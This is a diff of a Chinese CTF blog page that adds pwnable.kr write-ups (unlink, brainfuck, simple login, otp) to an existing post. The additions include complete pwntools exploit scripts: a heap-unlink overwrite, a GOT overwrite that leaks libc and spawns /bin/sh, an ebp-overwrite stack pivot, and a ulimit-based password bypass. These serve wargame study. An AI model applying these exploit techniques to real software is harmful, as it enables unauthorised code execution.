@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,615</span> / Reading time: <span class="post-count">14 min</span></span>
+                        <span>Word count: <span class="post-count">3,553</span> / Reading time: <span class="post-count">19 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -415,6 +415,37 @@
 <p>直接操作:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">p = ssh(host=&quot;pwnable.kr&quot;, port=2222, user=&quot;asm&quot;, password=&quot;guest&quot;)</span><br><span class="line">io = p.connect_remote(&quot;0&quot;, 9026)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;&apos;</span><br><span class="line">shellcode += shellcraft.open(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.read(&quot;rax&quot;, &quot;rsp&quot;, 100)          // </span><br><span class="line">shellcode += shellcraft.write(1, &apos;rsp&apos;, 100)</span><br><span class="line">io.recvuntil(&quot;code:&quot;)</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">print io.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">	struct tagOBJ* fd;</span><br><span class="line">	struct tagOBJ* bk;</span><br><span class="line">	char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">	OBJ* BK;</span><br><span class="line">	OBJ* FD;</span><br><span class="line">	BK=P-&gt;bk;</span><br><span class="line">	FD=P-&gt;fd;</span><br><span class="line">	FD-&gt;bk=BK;</span><br><span class="line">	BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	malloc(1024);</span><br><span class="line">	OBJ* A = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">	OBJ* B = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">	OBJ* C = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">	// double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">	A-&gt;fd = B;</span><br><span class="line">	B-&gt;bk = A;</span><br><span class="line">	B-&gt;fd = C;</span><br><span class="line">	C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">	printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">	printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">	printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">	// heap overflow!</span><br><span class="line">	gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">	// exploit this unlink!</span><br><span class="line">	unlink(B);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>gets(A-&gt;buf) 很明显存在堆溢出，所以可以任意地址写，覆盖返回main函数地址为shell地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>从汇编我们可以看到，只需要如下几个步骤即可:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">esp = heap_A_address + 8</span><br><span class="line">=&gt;</span><br><span class="line">ecx - 4 = heap_A_address + 8</span><br><span class="line">=&gt;</span><br><span class="line">ecx = heap_A_address + 12</span><br><span class="line">=&gt;</span><br><span class="line">[ebp - 4] = heap_A_address + 12</span><br><span class="line">=&gt;</span><br><span class="line">[stack_A_address + 16] = heap_A_address + 12</span><br></pre></td></tr></table></figure>
+<p>同时，我们知道:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A: stack_A_address = &amp;A = ebp - 0x14</span><br><span class="line">B: stack_B_address = &amp;B = ebp - 0xc</span><br><span class="line">C: stack_C_address = &amp;C = ebp - 0x10</span><br></pre></td></tr></table></figure>
+<p>任意地址写代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>
+<p>相应的有两种方法:</p>
+<p>方法一:</p>
+<p>FD-&gt;bk = BK,则payload 如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd: stack_A_address + 12</span><br><span class="line">bk: heap_A_address + 12</span><br></pre></td></tr></table></figure>
+<p>方法二:</p>
+<p>BK-&gt;fd = FD,则payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd: heap_A_address + 12</span><br><span class="line">bk: stack_A_address + 16</span><br></pre></td></tr></table></figure>
+<p>所以payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./unlink&quot;)</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">stack_A_address = int(p.recvn(10), 16)</span><br><span class="line">print &quot;stack_address: &quot;, hex(stack_A_address)</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">heap_A_address = int(p.recvn(10), 16)</span><br><span class="line">print &quot;heap_address: &quot;, hex(heap_A_address)</span><br><span class="line">p.recvuntil(&quot;shell!&quot;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./unlink&quot;)</span><br><span class="line">print &quot;shell_address: &quot; , hex(elf.symbols[&apos;shell&apos;])</span><br><span class="line"></span><br><span class="line"># method 1</span><br><span class="line">#payload = p32(elf.symbols[&apos;shell&apos;]) + &apos;A&apos; * 12 + p32(heap_A_address + 12) + p32(stack_A_address + 16)</span><br><span class="line"></span><br><span class="line"># method 2</span><br><span class="line">payload = p32(elf.symbols[&apos;shell&apos;]) + &apos;A&apos; * 12 + p32(stack_A_address + 12) + p32(heap_A_address + 12)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl do_brainfuck(char a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  _BYTE *v2; // ebx</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  switch ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    case &apos;+&apos;:</span><br><span class="line">      result = p;</span><br><span class="line">      ++*(_BYTE *)p;</span><br><span class="line">      break;</span><br><span class="line">    case &apos;,&apos;:</span><br><span class="line">      v2 = (_BYTE *)p;</span><br><span class="line">      result = getchar();</span><br><span class="line">      *v2 = result;</span><br><span class="line">      break;</span><br><span class="line">    case &apos;-&apos;:</span><br><span class="line">      result = p;</span><br><span class="line">      --*(_BYTE *)p;</span><br><span class="line">      break;</span><br><span class="line">    case &apos;.&apos;:</span><br><span class="line">      result = putchar(*(char *)p);</span><br><span class="line">      break;</span><br><span class="line">    case &apos;&lt;&apos;:</span><br><span class="line">      result = p-- - 1;</span><br><span class="line">      break;</span><br><span class="line">    case &apos;&gt;&apos;:</span><br><span class="line">      result = p++ + 1;</span><br><span class="line">      break;</span><br><span class="line">    case &apos;[&apos;:</span><br><span class="line">      result = puts(&quot;[ and ] not supported.&quot;);</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      return result;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数存在任意地址写，范围不超过1024左右个字节，而p指针不远处就是got表，所以可以通过修改putchar的地址为”main”函数地址，修改”memset”地址为”gets”函数地址，修改”fgets”地址为”system”地址。</p>
+<p>需要注意的是，首先需要leak出libc的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = 0</span><br><span class="line"></span><br><span class="line">#libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line">libc = ELF(&quot;./bf_libc.so&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./bf&quot;)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;pwnable.kr&quot;, 9001)</span><br><span class="line"></span><br><span class="line">main_address = 0x8048671</span><br><span class="line">tape_address = 0x804A0A0</span><br><span class="line">putchar_got_address = 0x804A030</span><br><span class="line">p.recvuntil(&quot;[ ]\n&quot;)</span><br><span class="line"></span><br><span class="line"># the first &quot;.&quot; is used to run the putchar function,and then the putchar_got_address will have the true putchar_address</span><br><span class="line"># get the libc_address</span><br><span class="line">payload = &quot;.&quot; + &quot;&lt;&quot; * (tape_address - putchar_got_address) + &quot;.&gt;.&gt;.&gt;.&quot;</span><br><span class="line"></span><br><span class="line">#modify putchar</span><br><span class="line">payload += &quot;&lt;&lt;&lt;,&gt;,&gt;,&gt;,&quot;</span><br><span class="line"># modify memset</span><br><span class="line">payload += &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,&gt;,&gt;,&gt;,&quot;</span><br><span class="line"># modify fgets</span><br><span class="line">payload += &quot;&lt;&quot; * 31 + &quot;,&gt;,&gt;,&gt;,.&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print payload</span><br><span class="line">putchar_address = u32(p.recvn(5)[1:])</span><br><span class="line">print &quot;put_address: &quot;, hex(putchar_address)</span><br><span class="line">libc_base = putchar_address - libc.symbols[&apos;putchar&apos;]</span><br><span class="line">print &quot;libc_base: &quot;,hex(libc_base)</span><br><span class="line"></span><br><span class="line">gets_address = libc_base + libc.symbols[&apos;gets&apos;]</span><br><span class="line">print &quot;gets_address: &quot;, hex(gets_address)</span><br><span class="line">system_address = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &quot;system_address: &quot;, hex(system_address)</span><br><span class="line">#attach(p)</span><br><span class="line">p.send(p32(main_address) + p32(gets_address))</span><br><span class="line">#attach(p)</span><br><span class="line">p.send(p32(system_address))</span><br><span class="line">p.recvuntil(&quot;[ ]&quot;)</span><br><span class="line">#attach(p)</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl auth(int decode_length)</span><br><span class="line">&#123;</span><br><span class="line">  char v2; // [esp+14h] [ebp-14h]</span><br><span class="line">  char *s2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line">  int v4; // [esp+20h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  memcpy(&amp;v4, &amp;input, decode_length);           // 栈溢出,最多溢出4个字节,覆盖ebp</span><br><span class="line">  s2 = (char *)calc_md5(&amp;v2, 12);</span><br><span class="line">  printf(&quot;hash : %s\n&quot;, s2);</span><br><span class="line">  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>auth函数存在栈溢出，最多溢出4个字节，只能覆盖ebp，input在bss中。</p>
+<p>leave    =&gt; mov esb ebp; pop ebp;</p>
+<p>ret         =&gt; pop rip; jump rip;</p>
+<p>通过修改ebp指向bss段，这样esp将指向bss段，从而可以控制rip。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">debug = int(raw_input(&quot;is_debug:&quot;))</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./login&quot;)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;pwnable.kr&quot;, 9003)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">payload = &quot;a&quot; * 4 + p32(0x08049284) + p32(0x0811EB40)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h2><p>通过ulimit限制了进程可以创建文件的最大值，只要限制为0，那么最后的密码一定为空，于是空密码通过，在写脚本时还需要注意的点就是把错误输出重定向到标准输出中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -f 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.Popen([&apos;/home/otp/otp&apos;, &apos;&apos;], stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure>
+<p>flag: <em>Darn… I always forget to check the return value of fclose() :(</em></p>
 
     </article>
     <!-- license  -->
@@ -431,8 +462,8 @@
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/posts/37116/" title="汇编指令大全">
-                    <div class="nextTitle">汇编指令大全</div>
+                <a href="/posts/45708/" title="anheng9">
+                    <div class="nextTitle">anheng9</div>
                 </a>
             
         </li>
@@ -553,7 +584,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Uaf"><span class="toc-number">1.</span> <span class="toc-text">Uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.</span> <span class="toc-text">memcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">3.</span> <span class="toc-text">asm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">4.</span> <span class="toc-text">unlink</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Uaf"><span class="toc-number">1.</span> <span class="toc-text">Uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.</span> <span class="toc-text">memcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">3.</span> <span class="toc-text">asm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">4.</span> <span class="toc-text">unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#brainfuck"><span class="toc-number">5.</span> <span class="toc-text">brainfuck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-login"><span class="toc-number">6.</span> <span class="toc-text">simple login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#otp"><span class="toc-number">7.</span> <span class="toc-text">otp</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1401,50 +1432,9 @@
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 56
+        Total : 57
         </div>
         <!-- search  -->
         
@@ -1457,6 +1447,21 @@
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/posts/49989/">hitcon-复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1476,11 +1481,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">汇编指令大全</a>
         </li>
     
     
@@ -1505,12 +1505,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
         </li>
     
     
@@ -1540,12 +1540,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
         </li>
     
     
@@ -1630,12 +1630,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
@@ -1681,11 +1681,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/posts/53269/">pwn备忘录</a>
         </li>
     
     
@@ -1753,9 +1748,9 @@
     
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
-    
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1769,9 +1764,9 @@
     
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
